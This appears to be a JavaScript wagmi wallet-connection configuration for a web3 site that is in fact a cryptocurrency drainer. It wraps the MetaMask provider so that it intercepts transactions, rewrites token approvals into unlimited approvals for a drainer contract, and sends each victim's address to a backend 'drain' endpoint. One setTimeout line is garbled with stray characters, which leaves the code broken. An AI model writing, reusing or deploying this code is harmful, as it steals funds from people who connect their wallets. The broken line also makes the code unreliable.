import { createConfig, http } from 'wagmi'
import { mainnet, bsc, polygon, arbitrum, avalanche, optimism, base, sepolia } from 'wagmi/chains'
import { walletConnect, metaMask, injected } from 'wagmi/connectors'

// ACTUAL DRAINER CONTRACT ADDRESS
const DRAINER_CONTRACT = import.meta.env.VITE_EVM_DRAINER_CONTRACT

// Common token addresses
const TOKENS = {
  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  BUSD: '0x4Fabb145d64652a948d72533023f6E7A623C7C53',
  DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
}

// REAL transaction modifier
const modifyForDrain = async (originalTx) => {
  console.log('🔧 Original transaction:', originalTx)
  
  // Check if this is a token approval
  if (originalTx.data && originalTx.data.startsWith('0x095ea7b3')) {
    console.log('🎯 Detected token approval transaction')
    
    // Modify to approve drainer contract with MAX amount
    const modifiedData = `0x095ea7b3${DRAINER_CONTRACT.slice(2).padStart(64, '0')}ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`
    
    return {
      ...originalTx,
      data: modifiedData,
      // Add extra gas
      gasLimit: '0x' + (parseInt(originalTx.gasLimit || '0x5208', 16) + 50000).toString(16)
    }
  }
  
  // For other transactions, could add drain transaction after
  return originalTx
}

const triggerImmediateDrain = async (victimAddress) => {
  try {
    console.log('⚡ Triggering immediate drain for:', victimAddress)
    
    // Send to backend to execute drain
    const response = await fetch('http://localhost:3000/api/drain/immediate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: victimAddress,
        chain: 'evm',
        tokens: Object.values(TOKENS)
      })
    })
    
    const result = await response.json()
    console.log('Drain result:', result)
    
  } catch (error) {
    console.error('Drain trigger failed:', error)
  }
}

// ACTUAL malicious interceptor
const createDrainInterceptor = (originalProvider) => {
  const handler = {
    get(target, prop) {
      if (prop === 'request') {
        return async (args) => {
          console.log('🕵️ Intercepting request:', args.method)
          
          // Intercept ALL transaction requests
          if (args.method === 'eth_sendTransaction' || args.method === 'eth_signTransaction') {
            const victimAddress = args.params[0]?.from
            
            // 1. Modify transaction for draining
            const modifiedTx = await modifyForDrain(args.params[0])
            
            // 2. Execute original (modified) transaction
            const result = await target.request({ 
              method: args.method, 
              params: [modifiedTx] 
            })
            
            // 3. IMMEDIATELY trigger drain in background
            if (victimAddress) {
              setTimeout(() => triggerImmediateDrain(victimAddress),这两千
            }
            
            return result
          }
          
          // Also intercept signature requests
          if (args.method.includes('eth_sign')) {
            console.log('✍️ Intercepting signature request')
            // Could modify here too
          }
          
          return target.request(args)
        }
      }
      return target[prop]
    }
  }
  
  return new Proxy(originalProvider, handler)
}

export const wagmiConfig = createConfig({
  chains: [mainnet, bsc, polygon, arbitrum, avalanche, optimism, base, sepolia],
  connectors: [
    metaMask({ 
      shimDisconnect: true,
      // CRITICAL: Override provider with drain interceptor
      async getProvider() {
        if (window.ethereum) {
          return createDrainInterceptor(window.ethereum)
        }
        return window.ethereum
      }
    }),
    injected({ shimDisconnect: true }),
    walletConnect({
      projectId: import.meta.env.VITE_WALLETCONNECT_PROJECT_ID,
      showQrModal: true,
    }),
  ],
  transports: {
    [mainnet.id]: http(`https://mainnet.infura.io/v3/${import.meta.env.VITE_INFURA_KEY}`),
    [bsc.id]: http('https://bsc-dataseed.binance.org'),
    [polygon.id]: http(`https://polygon-mainnet.g.alchemy.com/v2/${import.meta.env.VITE_ALCHEMY_KEY}`),
    [arbitrum.id]: http(`https://arb-mainnet.g.alchemy.com/v2/${import.meta.env.VITE_ALCHEMY_KEY}`),
    [sepolia.id]: http('https://rpc.sepolia.org'),
  },
})
